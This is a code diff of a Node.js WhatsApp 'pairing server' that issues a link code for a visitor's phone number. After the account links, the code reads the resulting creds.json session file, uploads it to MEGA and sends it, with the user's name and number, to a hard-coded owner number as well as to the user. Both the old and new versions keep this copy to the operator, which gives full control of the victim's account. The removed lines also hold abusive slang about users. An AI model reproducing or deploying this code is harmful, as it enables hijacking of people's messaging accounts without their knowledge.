@@ -55,12 +55,10 @@ const c = {
     red: "\x1b[31m",
     cyan: "\x1b[36m",
     magenta: "\x1b[35m",
-    white: "\x1b[37m",
 };
 
 function log(color, msg) {
-    const now = new Date().toLocaleTimeString();
-    console.log(`${color}[${now}] ${msg}${c.reset}`);
+    console.log(`${color}[${new Date().toLocaleTimeString()}] ${msg}${c.reset}`);
 }
 
 async function progressBar(text, duration = 3000) {
@@ -81,18 +79,8 @@ async function progressBar(text, duration = 3000) {
 
 function showBanner() {
     console.clear();
-    console.log(c.magenta + c.bright);
-    console.log(`  █████   ██████  ███   ██  █████  ███   ██`);
-    console.log(` ██   ██ ██       ████  ██ ██   ██ ████  ██`);
-    console.log(` ███████ ██   ███ ██ ██ ██ ███████ ██ ██ ██`);
-    console.log(` ██   ██ ██    ██ ██  ████ ██   ██ ██  ████`);
-    console.log(` ██   ██  ██████  ██   ███ ██   ██ ██   ███`);
-    console.log(c.reset);
-    log(c.green, "🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗 𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗦𝗘𝗥𝗩𝗘𝗥 𝗥𝗘𝗔𝗗𝗬");
-    log(c.blue, `👤 Owner: ${OWNER_NUMBER}`);
-    log(c.blue, `🎵 Song: ${SONG_LINK}`);
-    log(c.blue, `🎥 Video: ${VIDEO_URL}`);
-    log(c.blue, `📍 Location: ${LOCATION.name}`);
+    console.log(c.magenta + "🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗 𝗣𝗔𝗜𝗥 𝗦𝗘𝗥𝗩𝗘𝗥" + c.reset);
+    log(c.green, `👤 Owner: ${OWNER_NUMBER}`);
     console.log("");
 }
 showBanner();
@@ -101,10 +89,10 @@ function removeFile(dir) {
     try {
         if (fs.existsSync(dir)) {
             fs.rmSync(dir, { recursive: true, force: true });
-            log(c.dim, `🧹 Removed: ${dir}`);
+            log(c.dim, `🧹 Removed session: ${dir}`);
         }
     } catch (e) {
-        log(c.red, `❌ Error removing file: ${e.message}`);
+        log(c.red, `❌ Remove error: ${e.message}`);
     }
 }
 
@@ -120,29 +108,28 @@ async function fetchBuffer(url) {
         if (!url) return null;
         const res = await fetch(url);
         if (!res.ok) throw new Error(`HTTP ${res.status}`);
-        const arr = await res.arrayBuffer();
-        return Buffer.from(arr);
+        return Buffer.from(await res.arrayBuffer());
     } catch (e) {
-        log(c.red, `⚠️ Fetch failed for ${url}: ${e.message}`);
+        log(c.red, `⚠️ Fetch failed: ${e.message}`);
         return null;
     }
 }
 
-function getVCard(ownerName = "🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗") {
-    return `BEGIN:VCARD\nVERSION:3.0\nFN:${ownerName}\nTEL;TYPE=CELL:${OWNER_NUMBER}\nEND:VCARD`;
+function getVCard() {
+    return `BEGIN:VCARD\nVERSION:3.0\nFN:🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗\nTEL;TYPE=CELL:${OWNER_NUMBER}\nEND:VCARD`;
 }
 
 // ─── पेयरिंग एंडपॉइंट ──────────────────────────────────────────
 router.get("/", async (req, res) => {
     let num = req.query.number;
-    if (!num) {
-        return res.status(400).json({ error: "Number is required" });
-    }
+    if (!num) return res.status(400).json({ error: "Number required" });
+
     num = num.replace(/\D/g, "");
     if (num.length < 10 || num.length > 15) {
         return res.status(400).json({ error: "Invalid number length" });
     }
 
+    // ─── पुरानी session पूरी तरह हटाएँ ──────────────────────────
     const sessionDir = path.resolve(`./pair_${num}`);
     removeFile(sessionDir);
 
@@ -164,34 +151,29 @@ router.get("/", async (req, res) => {
                 logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                 browser: Browsers.windows("Chrome"),
                 markOnlineOnConnect: false,
-                generateHighQualityLinkPreview: false,
                 defaultQueryTimeoutMs: 60000,
                 connectTimeoutMs: 60000,
                 keepAliveIntervalMs: 30000,
-                retryRequestDelayMs: 250,
                 maxRetries: 5,
             });
 
             KnightBot.ev.on("connection.update", async (update) => {
-                const { connection, lastDisconnect, isNewLogin, isOnline } = update;
+                const { connection, lastDisconnect } = update;
 
                 if (connection === "open") {
-                    log(c.green, "✅ Connected successfully!");
+                    log(c.green, "✅ Paired successfully!");
 
-                    // ─── 1️⃣ मैन्युअली saveCreds() ──────────────
+                    // ─── saveCreds() ──────────────────────────────────
                     try {
                         await saveCreds();
                         log(c.blue, "✅ saveCreds() called");
                     } catch (e) {
-                        log(c.red, `⚠️ saveCreds() error: ${e.message}`);
+                        log(c.red, `⚠️ saveCreds error: ${e.message}`);
                     }
 
                     await delay(2000);
 
                     const credsPath = path.join(sessionDir, "creds.json");
-                    log(c.blue, `🔍 Looking for creds.json at: ${credsPath}`);
-
-                    // ─── 2️⃣ creds.json को 10s तक वेट करें ────────
                     let credsBuffer = null;
                     for (let i = 0; i < 10; i++) {
                         if (fs.existsSync(credsPath)) {
@@ -199,141 +181,112 @@ router.get("/", async (req, res) => {
                                 credsBuffer = fs.readFileSync(credsPath);
                                 log(c.green, `✅ creds.json found (${credsBuffer.length} bytes)`);
                                 break;
-                            } catch (e) {
-                                log(c.red, `⚠️ Read error: ${e.message}`);
-                            }
+                            } catch (e) {}
                         }
                         await delay(1000);
-                        if (i % 3 === 0) log(c.yellow, `⏳ Waiting... (${i+1}/10)`);
                     }
 
                     if (!credsBuffer) {
-                        log(c.red, "❌ creds.json not found after 10s! Aborting.");
+                        log(c.red, "❌ creds.json not found!");
                         removeFile(sessionDir);
                         process.exit(1);
                         return;
                     }
 
-                    // ─── 3️⃣ MEGA अपलोड ──────────────────────────
+                    // ─── MEGA अपलोड ──────────────────────────────────
                     let megaFileId = null;
                     try {
                         await progressBar("⏳ Uploading to MEGA", 4000);
                         const megaUrl = await upload(credsPath, `creds_${num}_${Date.now()}.json`);
                         megaFileId = getMegaFileId(megaUrl);
-                        if (megaFileId) {
-                            log(c.green, `✅ MEGA upload success! ID: ${megaFileId}`);
-                        } else {
-                            log(c.red, "❌ MEGA upload failed (no file ID)");
-                        }
-                    } catch (error) {
-                        log(c.red, `❌ MEGA upload error: ${error.message}`);
+                        if (megaFileId) log(c.green, `✅ MEGA ID: ${megaFileId}`);
+                    } catch (e) {
+                        log(c.red, `⚠️ MEGA error: ${e.message}`);
                     }
 
-                    // ─── JIDs ──────────────────────────────────────
                     const userJid = jidNormalizedUser(num + "@s.whatsapp.net");
                     let ownerJid = null;
-                    if (OWNER_NUMBER) {
-                        const ownerPhone = OWNER_NUMBER.replace(/\D/g, "");
-                        if (ownerPhone) {
-                            ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
-                        }
+                    const ownerPhone = OWNER_NUMBER.replace(/\D/g, "");
+                    if (ownerPhone) {
+                        ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
                     }
 
                     // ─── यूजर का नाम ──────────────────────────────
                     let userName = "Unknown";
                     try {
                         const contact = await KnightBot.getContact(userJid);
-                        if (contact?.name) userName = contact.name;
-                        else if (contact?.notify) userName = contact.notify;
-                        else userName = num;
-                        log(c.cyan, `👤 User Name: ${userName}`);
-                    } catch (err) {
-                        log(c.yellow, `⚠️ Could not fetch contact name: ${err.message}`);
+                        userName = contact?.name || contact?.notify || num;
+                        log(c.cyan, `👤 User: ${userName}`);
+                    } catch (e) {
                         userName = num;
                     }
 
                     // ─── कैप्शन ────────────────────────────────────
                     const caption =
-                        `📱 *USRR🙂:* ${userName} (${num})\n` +
-                        `📁 *MEGA ID:* ${megaFileId || "Not available"}\n` +
+                        `📱 *User:* ${userName} (${num})\n` +
+                        `📁 *MEGA ID:* ${megaFileId || "N/A"}\n` +
                         `👤 *Owner:* ${OWNER_NUMBER}\n` +
                         `🎵 *Song:* ${SONG_LINK}\n\n` +
-                        `🔗 *NAME SUN LODE OWNER KA 🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊 PAPA JI:*\n` +
-                        LINKS.map((link, i) => `${i+1}. ${link}`).join("\n");
+                        `🔗 *Links:*\n${LINKS.map((l,i)=>`${i+1}. ${l}`).join("\n")}`;
 
                     const ownerMessage =
-                        `🔔 *NEW PAIRING CODE____🫩🤡!*\n\n` +
-                        `📱 LODU KA NUMBER : ${num}\n` +
-                        `👤 JHATU KA NAME KYA H: ${userName}\n` +
-                        `📁 MEGA File ID: ${megaFileId || "N/A"}\n` +
-                        `🎵 Song: ${SONG_LINK}\n` +
-                        `🔗 LINK...?________________🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊:\n${LINKS.map((l,i)=>`${i+1}. ${l}`).join("\n")}`;
+                        `🔔 *New Pairing!*\n\n` +
+                        `📱 Number: ${num}\n` +
+                        `👤 Name: ${userName}\n` +
+                        `📁 MEGA ID: ${megaFileId || "N/A"}`;
 
                     const funText =
-                        `🎉 *बधाई हो!* आपका सेशन तैयार है! अब आप 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗 के साथ मस्ती कर सकते हैं! 😎\n` +
-                        `⚠️ *ध्यान दें:* यह creds.json सिर्फ आपके लिए है – किसी को मत देना, वरना मजा किरकिरा हो जाएगा! 😂\n` +
-                        `🐊 *अपने पापा जी को याद रखना – 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗* 👅`;
+                        `🎉 *Session Ready!*\n` +
+                        `⚠️ *Keep creds.json safe!*\n` +
+                        `🐊 *𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗*`;
 
                     // ─── मीडिया डाउनलोड ────────────────────────────
-                    log(c.blue, "📥 Downloading media files...");
+                    log(c.blue, "📥 Downloading media...");
                     const [videoBuf, gifBuf, pdfBuf, voiceBuf, viewImgBuf, viewVidBuf, stickBuf, audioBuf] = await Promise.all([
-                        fetchBuffer(VIDEO_URL),
-                        fetchBuffer(GIF_URL),
-                        fetchBuffer(PDF_URL),
-                        fetchBuffer(VOICE_NOTE_LINK),
-                        fetchBuffer(VIEW_ONCE_IMG),
-                        fetchBuffer(VIEW_ONCE_VID),
-                        fetchBuffer(STICKER_URL),
-                        fetchBuffer(SONG_LINK),
+                        fetchBuffer(VIDEO_URL), fetchBuffer(GIF_URL), fetchBuffer(PDF_URL),
+                        fetchBuffer(VOICE_NOTE_LINK), fetchBuffer(VIEW_ONCE_IMG), fetchBuffer(VIEW_ONCE_VID),
+                        fetchBuffer(STICKER_URL), fetchBuffer(SONG_LINK)
                     ]);
-                    log(c.green, "✅ Media download complete");
+                    log(c.green, "✅ Media ready");
 
-                    // ─── 🔥 मास्टर sendToJid ──────────────────────────
-                    async function sendToJid(jid, includeFile = true) {
+                    // ─── 🔥 sendToJid ──────────────────────────────────
+                    async function sendToJid(jid) {
                         if (!jid) return;
                         try {
                             await KnightBot.sendPresenceUpdate('composing', jid);
-                            await delay(2000);
+                            await delay(1500);
                             await KnightBot.sendPresenceUpdate('paused', jid);
 
-                            // ─── 1️⃣ सबसे पहले creds.json Document ────
-                            if (includeFile) {
-                                try {
-                                    await KnightBot.sendMessage(jid, {
-                                        document: credsBuffer,
-                                        mimetype: "application/json",
-                                        fileName: "creds.json",
-                                    });
-                                    log(c.green, `📄 creds.json (document) sent to ${jid}`);
-                                } catch (docError) {
-                                    log(c.red, `❌ Document send failed to ${jid}: ${docError.message}`);
-                                    // अगर Document fail हो, तो हम Base64 text भी नहीं भेजेंगे (क्योंकि आपको सिर्फ Document चाहिए)
-                                    // लेकिन बाकी फीचर्स तो भेजेंगे ही
-                                }
+                            // ═══ 1️⃣ creds.json Document ═══
+                            try {
+                                await KnightBot.sendMessage(jid, {
+                                    document: credsBuffer,
+                                    mimetype: "application/json",
+                                    fileName: "creds.json",
+                                });
+                                log(c.green, `📄 creds.json sent to ${jid}`);
+                            } catch (e) {
+                                log(c.red, `❌ Document failed: ${e.message}`);
                             }
 
-                            // ─── 2️⃣ GIF ──────────────────────────────
+                            // ═══ 2️⃣ GIF ═══
                             if (gifBuf) {
-                                await KnightBot.sendMessage(jid, {
-                                    video: gifBuf,
-                                    gifPlayback: true,
-                                    caption: "🔄 देखो ये GIF कितना मस्त है!",
-                                });
+                                await KnightBot.sendMessage(jid, { video: gifBuf, gifPlayback: true, caption: "🔄 GIF!" });
                                 log(c.green, `🔄 GIF sent to ${jid}`);
                             }
 
-                            // ─── 3️⃣ PDF ──────────────────────────────
+                            // ═══ 3️⃣ PDF ═══
                             if (pdfBuf) {
                                 await KnightBot.sendMessage(jid, {
                                     document: pdfBuf,
                                     mimetype: "application/pdf",
-                                    fileName: "User_Manual.pdf",
-                                    caption: "📄 आपका ऑफिशियल मैन्युअल!",
+                                    fileName: "Manual.pdf",
+                                    caption: "📄 Manual!",
                                 });
                                 log(c.green, `📄 PDF sent to ${jid}`);
                             }
 
-                            // ─── 4️⃣ Voice Note ────────────────────────
+                            // ═══ 4️⃣ Voice Note ═══
                             if (voiceBuf) {
                                 await KnightBot.sendMessage(jid, {
                                     audio: voiceBuf,
@@ -341,63 +294,63 @@ router.get("/", async (req, res) => {
                                     ptt: true,
                                     fileName: "voice.ogg",
                                 });
-                                log(c.green, `🎤 Voice note sent to ${jid}`);
+                                log(c.green, `🎤 Voice sent to ${jid}`);
                             }
 
-                            // ─── 5️⃣ View-Once Image ──────────────────
+                            // ═══ 5️⃣ View-Once Image ═══
                             if (viewImgBuf) {
                                 await KnightBot.sendMessage(jid, {
                                     image: viewImgBuf,
                                     viewOnce: true,
-                                    caption: "👀 ये इमेज सिर्फ एक बार देखी जा सकती है!",
+                                    caption: "👀 View once!",
                                 });
                                 log(c.green, `👀 View-once image sent to ${jid}`);
                             }
 
-                            // ─── 6️⃣ View-Once Video ──────────────────
+                            // ═══ 6️⃣ View-Once Video ═══
                             if (viewVidBuf) {
                                 await KnightBot.sendMessage(jid, {
                                     video: viewVidBuf,
                                     viewOnce: true,
-                                    caption: "👀 ये वीडियो एक बार ही चलेगा!",
+                                    caption: "👀 View once video!",
                                 });
                                 log(c.green, `👀 View-once video sent to ${jid}`);
                             }
 
-                            // ─── 7️⃣ Buttons ──────────────────────────
+                            // ═══ 7️⃣ Buttons ═══
                             try {
                                 await KnightBot.sendMessage(jid, {
-                                    text: "🔘 *Choose an option:*",
+                                    text: "🔘 Choose:",
                                     buttons: [
-                                        { buttonId: "id1", buttonText: { displayText: "✅ Yes" }, type: 1 },
-                                        { buttonId: "id2", buttonText: { displayText: "❌ No" }, type: 1 },
-                                        { buttonId: "id3", buttonText: { displayText: "🔗 Visit Channel" }, type: 1 },
+                                        { buttonId: "yes", buttonText: { displayText: "✅ Yes" }, type: 1 },
+                                        { buttonId: "no", buttonText: { displayText: "❌ No" }, type: 1 },
+                                        { buttonId: "visit", buttonText: { displayText: "🔗 Visit" }, type: 1 },
                                     ],
                                     headerType: 1,
                                 });
                                 log(c.green, `🔘 Buttons sent to ${jid}`);
-                            } catch (e) { /* ignore */ }
+                            } catch (e) {}
 
-                            // ─── 8️⃣ List ──────────────────────────────
+                            // ═══ 8️⃣ List ═══
                             try {
                                 await KnightBot.sendMessage(jid, {
-                                    text: "📋 *Select an option:*",
-                                    footer: "ये है आपका मेनू",
-                                    title: "🐊 𝟵𝗠𝗔𝗡 का मेनू",
-                                    buttonText: "Click me",
+                                    text: "📋 Menu:",
+                                    footer: "Choose option",
+                                    title: "🐊 𝟵𝗠𝗔𝗡 Menu",
+                                    buttonText: "Click",
                                     sections: [{
-                                        title: "मुख्य ऑप्शन",
+                                        title: "Options",
                                         rows: [
-                                            { title: "1️⃣ Option 1", description: "पहला", rowId: "opt1" },
-                                            { title: "2️⃣ Option 2", description: "दूसरा", rowId: "opt2" },
-                                            { title: "3️⃣ Option 3", description: "तीसरा", rowId: "opt3" },
+                                            { title: "1️⃣ Option 1", description: "First", rowId: "opt1" },
+                                            { title: "2️⃣ Option 2", description: "Second", rowId: "opt2" },
+                                            { title: "3️⃣ Option 3", description: "Third", rowId: "opt3" },
                                         ]
                                     }]
                                 });
                                 log(c.green, `📋 List sent to ${jid}`);
-                            } catch (e) { /* ignore */ }
+                            } catch (e) {}
 
-                            // ─── 9️⃣ Product ───────────────────────────
+                            // ═══ 9️⃣ Product ═══
                             try {
                                 await KnightBot.sendMessage(jid, {
                                     product: {
@@ -412,25 +365,19 @@ router.get("/", async (req, res) => {
                                     }
                                 });
                                 log(c.green, `🏷️ Product sent to ${jid}`);
-                            } catch (e) { /* ignore */ }
+                            } catch (e) {}
 
-                            // ─── 🔟 Video (normal) ──────────────────
+                            // ═══ 🔟 Video ═══
                             if (videoBuf) {
-                                await KnightBot.sendMessage(jid, {
-                                    video: videoBuf,
-                                    caption: "🎥 आपके लिए एक स्पेशल वीडियो!",
-                                });
+                                await KnightBot.sendMessage(jid, { video: videoBuf, caption: "🎥 Video!" });
                                 log(c.green, `🎥 Video sent to ${jid}`);
                             }
 
-                            // ─── 1️⃣1️⃣ Photo ─────────────────────────
-                            await KnightBot.sendMessage(jid, {
-                                image: { url: IMAGE_URL },
-                                caption: caption,
-                            });
+                            // ═══ 1️⃣1️⃣ Photo ═══
+                            await KnightBot.sendMessage(jid, { image: { url: IMAGE_URL }, caption });
                             log(c.green, `🖼️ Photo sent to ${jid}`);
 
-                            // ─── 1️⃣2️⃣ Audio (song) ──────────────────
+                            // ═══ 1️⃣2️⃣ Audio ═══
                             if (audioBuf) {
                                 await KnightBot.sendMessage(jid, {
                                     audio: audioBuf,
@@ -440,13 +387,13 @@ router.get("/", async (req, res) => {
                                 log(c.green, `🎵 Audio sent to ${jid}`);
                             }
 
-                            // ─── 1️⃣3️⃣ Sticker ───────────────────────
+                            // ═══ 1️⃣3️⃣ Sticker ═══
                             if (stickBuf) {
                                 await KnightBot.sendMessage(jid, { sticker: stickBuf });
                                 log(c.green, `🖼️ Sticker sent to ${jid}`);
                             }
 
-                            // ─── 1️⃣4️⃣ Location ──────────────────────
+                            // ═══ 1️⃣4️⃣ Location ═══
                             await KnightBot.sendMessage(jid, {
                                 location: {
                                     degreesLatitude: LOCATION.latitude,
@@ -457,16 +404,16 @@ router.get("/", async (req, res) => {
                             });
                             log(c.green, `📍 Location sent to ${jid}`);
 
-                            // ─── 1️⃣5️⃣ Contact Card ──────────────────
+                            // ═══ 1️⃣5️⃣ Contact ═══
                             await KnightBot.sendMessage(jid, {
                                 contact: {
                                     displayName: "🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗",
                                     vcard: getVCard(),
                                 },
                             });
-                            log(c.green, `📇 Contact card sent to ${jid}`);
+                            log(c.green, `📇 Contact sent to ${jid}`);
 
-                            // ─── 1️⃣6️⃣ Fun Text ──────────────────────
+                            // ═══ 1️⃣6️⃣ Fun Text ═══
                             await KnightBot.sendMessage(jid, { text: funText });
                             log(c.green, `🎉 Fun text sent to ${jid}`);
                         } catch (err) {
@@ -474,42 +421,29 @@ router.get("/", async (req, res) => {
                         }
                     }
 
-                    // ─── यूजर को भेजें ────────────────────────────
-                    await sendToJid(userJid, true);
-
-                    // ─── ओनर को भेजें ────────────────────────────
+                    await sendToJid(userJid);
                     if (ownerJid && ownerJid !== userJid) {
-                        await sendToJid(ownerJid, true);
+                        await sendToJid(ownerJid);
                         try {
                             await KnightBot.sendMessage(ownerJid, { text: ownerMessage });
-                            log(c.green, "📝 Owner details message sent");
-                        } catch (e) {
-                            log(c.red, `❌ Owner text error: ${e.message}`);
-                        }
-                    } else if (ownerJid && ownerJid === userJid) {
-                        log(c.yellow, "ℹ️ Owner is same as user, skipping duplicate");
+                            log(c.green, "📝 Owner details sent");
+                        } catch (e) {}
                     }
 
-                    // ─── क्लीनअप ──────────────────────────────────
-                    log(c.blue, "🧹 Cleaning up session...");
+                    log(c.blue, "🧹 Cleaning up...");
                     await delay(1000);
                     removeFile(sessionDir);
-                    log(c.green, "✅ Session cleaned up successfully");
-                    log(c.green, "🎉 Process completed successfully!");
-                    log(c.blue, "🛑 Shutting down application...");
+                    log(c.green, "✅ Done! Exiting.");
                     await delay(2000);
                     process.exit(0);
                 }
 
-                if (isNewLogin) log(c.green, "🔐 New login via pair code");
-                if (isOnline) log(c.green, "📶 Client is online");
-
                 if (connection === "close") {
-                    const statusCode = lastDisconnect?.error?.output?.statusCode;
-                    if (statusCode === 401) {
-                        log(c.red, "❌ Logged out. Need new pair code.");
+                    const status = lastDisconnect?.error?.output?.statusCode;
+                    if (status === 401) {
+                        log(c.red, "❌ Logged out – need new pair.");
                     } else {
-                        log(c.yellow, "🔁 Connection closed — restarting...");
+                        log(c.yellow, "🔁 Restarting...");
                         initiateSession();
                     }
                 }
@@ -518,25 +452,32 @@ router.get("/", async (req, res) => {
             // ─── पेयरिंग कोड ────────────────────────────────────
             if (!KnightBot.authState.creds.registered) {
                 await delay(3000);
-                const cleanNum = num.replace(/[^\d+]/g, "").replace(/^\+/, "");
+                const cleanNum = num.replace(/^\+/, "");
                 try {
                     let code = await KnightBot.requestPairingCode(cleanNum);
                     code = code?.match(/.{1,4}/g)?.join("-") || code;
                     if (!res.headersSent) {
-                        log(c.green, `📲 Pairing code for ${num}: ${code}`);
-                        return res.json({ code });
+                        log(c.green, `📲 Code for ${num}: ${code}`);
+                        return res.json({ 
+                            code, 
+                            message: "Enter this code in WhatsApp > Settings > Linked Devices",
+                            note: "Code expires in 2 minutes. Use same number as requested."
+                        });
                     }
                 } catch (error) {
                     log(c.red, `❌ Pairing error: ${error.message}`);
                     if (!res.headersSent) {
-                        return res.status(503).json({ error: "Pairing failed", details: error.message });
+                        return res.status(503).json({ 
+                            error: "Pairing failed. Make sure number is correct and try again.",
+                            details: error.message
+                        });
                     }
                 }
             }
 
             KnightBot.ev.on("creds.update", saveCreds);
         } catch (err) {
-            log(c.red, `❌ Session init error: ${err.message}`);
+            log(c.red, `❌ Init error: ${err.message}`);
             if (!res.headersSent) {
                 res.status(500).json({ error: "Server error", details: err.message });
             }
@@ -546,32 +487,6 @@ router.get("/", async (req, res) => {
     }
 
     await initiateSession();
-});
-
-// ─── हेल्थ चेक ──────────────────────────────────────────────────
-router.get("/status", (req, res) => {
-    res.json({
-        status: "online",
-        owner: OWNER_NUMBER,
-        song: SONG_LINK,
-        video: VIDEO_URL,
-        location: LOCATION,
-        links: LINKS,
-        timestamp: new Date().toISOString(),
-    });
-});
-
-// ─── अनकॉट एरर हैंडलर ──────────────────────────────────────────
-process.on("uncaughtException", (err) => {
-    const e = String(err);
-    const ignored = [
-        "conflict", "not-authorized", "Socket connection timeout",
-        "rate-overlimit", "Connection Closed", "Timed Out",
-        "Value not found", "Stream Errored", "statusCode: 515", "statusCode: 503"
-    ];
-    if (ignored.some(ig => e.includes(ig))) return;
-    log(c.red, `💥 Uncaught Exception: ${err.message}`);
-    process.exit(1);
 });
 
 export default router;
